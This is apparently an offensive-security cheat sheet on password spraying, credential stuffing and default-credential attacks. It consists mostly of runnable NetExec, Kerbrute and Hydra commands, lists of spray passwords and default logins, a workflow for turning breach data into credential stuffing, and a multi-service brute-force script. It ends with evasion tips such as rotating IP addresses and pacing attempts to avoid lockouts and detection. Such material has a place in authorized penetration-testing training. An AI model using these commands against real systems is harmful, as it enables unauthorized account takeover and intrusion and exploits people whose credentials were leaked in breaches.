# 🛰️ Advanced Attack Techniques

## Password Spraying
🔍 When to use password spraying:

- Companies with standard password policies.
- Default passwords are commonly used.
- Avoiding account lockouts (one password per user).
- Active Directory environments.

🛠️ Tools for password spraying:
```bash
# NetExec password spray
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'

# Kerbrute for AD (faster)
kerbrute passwordspray --dc 10.100.38.1 usernames.txt 'Password123!'

# Hydra password spray
hydra -L usernames.txt -p 'Password123!' ssh://10.100.38.23

# Custom script for multiple targets
for ip in $(cat targets.txt); do
    netexec smb $ip -u usernames.txt -p 'Password123!'
done
```

🛡️ Common spray passwords:
- `Password123!`
- `Welcome1!`
- `ChangeMe123!`
- `CompanyName2024!`
- `Summer2024!`
- `Monday123!`
- `P@ssw0rd`

---

## Credential Stuffing
🔍 Definition:
Using stolen credentials from one service to access others.

🛠️ Sources of credentials:
- Database breaches.
- Password dumps.
- Previous compromises.
- OSINT findings.

🛠️ Tools for credential stuffing:
```bash
# Hydra with credential pairs
hydra -C user_pass.list ssh://10.100.38.23

# NetExec with credential pairs
netexec smb 10.100.38.23 -u users.txt -p passwords.txt --no-bruteforce

# Custom format: username:password
cat user_pass.list
admin:admin
user:password
root:toor
```

🛡️ Credential stuffing workflow:
```bash
# 1. Prepare credentials from breach data
cat breach_data.txt | cut -d: -f1,2 > credentials.txt

# 2. Test against multiple services
for service in ssh smb rdp winrm; do
    echo "[*] Testing $service..."
    netexec $service targets.txt -C credentials.txt
done

# 3. Focus on successful hits
netexec smb successful_targets.txt -C credentials.txt --continue-on-success
```

---

## Default Credentials
🔍 Definition:
Factory-set credentials that remain unchanged.

🛡️ Common default credentials:

### Database defaults:
```bash
# MySQL
mysql: root:(blank)
mysql: root:root
mysql: root:password

# PostgreSQL
postgres: postgres:postgres

# MSSQL
mssql: sa:(blank)
mssql: sa:sa
```

### Web applications:
```text
admin:admin
administrator:password
admin:password
admin:(blank)
user:user
```

### Network devices:
| Brand | Default IP     | Username | Password  |
|-------|----------------|----------|-----------|
| 3Com  | 192.168.1.1    | admin    | Admin     |
| Belkin| 192.168.2.1    | admin    | admin     |
| D-Link| 192.168.0.1    | admin    | Admin     |
| Linksys| 192.168.1.1   | admin    | Admin     |
| Netgear| 192.168.0.1   | admin    | password  |

🛠️ Default Credentials Cheat Sheet tool:
```bash
# Install the tool
pip3 install defaultcreds-cheat-sheet

# Search for specific vendor
creds search linksys
creds search cisco
creds search netgear

# Export to file
creds search linksys --format csv > linksys_creds.csv
```

🛠️ Testing default credentials:
```bash
# Create default credentials list
cat > default_creds.txt << EOF
admin:admin
admin:password
admin:
root:root
root:password
administrator:admin
user:user
guest:guest
EOF

# Test against multiple targets
netexec ssh 192.168.1.0/24 -C default_creds.txt
netexec smb 192.168.1.0/24 -C default_creds.txt
```

---

## Database Default Credentials
🛠️ Testing database default credentials:
```bash
# MySQL defaults
mysql -h target -u root -p''
mysql -h target -u root -proot
mysql -h target -u admin -padmin

# PostgreSQL defaults
psql -h target -U postgres -d postgres
psql -h target -U admin -d admin

# MSSQL defaults
netexec mssql target -u sa -p ''
netexec mssql target -u sa -p sa
```

---

## IoT/Embedded Device Defaults
🛠️ Common IoT credentials:
```text
admin:admin
admin:password
admin:12345
admin:1234
root:root
root:password
user:user
guest:guest
```

🛠️ IP cameras:
```bash
# Default credentials for IP cameras
admin:admin
admin:password
admin:12345
root:pass
admin:
```

🛠️ Printers:
```text
admin:admin
admin:password
admin:
root:root
```

---

## Web Application Defaults
🛠️ Common web app defaults:
```bash
# Example default credentials for web apps
admin:admin
admin:password
administrator:password
admin:changeme
root:root
demo:demo
test:test
guest:guest
```

🛠️ CMS defaults:
- WordPress: `admin: admin`
- Joomla: `admin: admin`
- Drupal: `admin: admin`

---

## Automation Script for Advanced Attacks
```bash
#!/bin/bash
# Multi-service brute force script with advanced techniques

TARGET=$1
USERS="users.txt"
PASSWORDS="passwords.txt"
DEFAULT_CREDS="default_creds.txt"

echo "[+] Starting multi-service brute force against $TARGET"

# Phase 1: Default credentials
echo "[*] Testing default credentials..."
netexec ssh $TARGET -C $DEFAULT_CREDS
netexec smb $TARGET -C $DEFAULT_CREDS
netexec rdp $TARGET -C $DEFAULT_CREDS
netexec winrm $TARGET -C $DEFAULT_CREDS

# Phase 2: Password spraying
echo "[*] Password spraying common passwords..."
for password in "Password123!" "Welcome1!" "ChangeMe123!"; do
    netexec smb $TARGET -u $USERS -p "$password"
done

# Phase 3: Traditional brute force
echo "[*] Traditional brute force..."
netexec ssh $TARGET -u $USERS -p $PASSWORDS -t 4
netexec smb $TARGET -u $USERS -p $PASSWORDS
netexec rdp $TARGET -u $USERS -p $PASSWORDS
netexec winrm $TARGET -u $USERS -p $PASSWORDS

echo "[+] Brute force complete!"
```

---

## Best Practices for Advanced Attacks
🛡️ 1. Password Spraying Strategy:
- Start with most common passwords.
- Use seasonal/temporal passwords.
- Include company-specific patterns.
- Avoid account lockouts by limiting attempts.

🛡️ 2. Credential Stuffing Tips:
- Use recent breach data.
- Focus on high-value services first.
- Test corporate email patterns.
- Check for credential reuse patterns.

🛡️ 3. Default Credential Hunting:
- Research target technologies.
- Check vendor documentation.
- Use automated tools.
- Focus on forgotten/test systems.

🛡️ 4. Operational Security:
- Rotate IP addresses.
- Use delays between attempts.
- Monitor for detection systems.
- Document successful patterns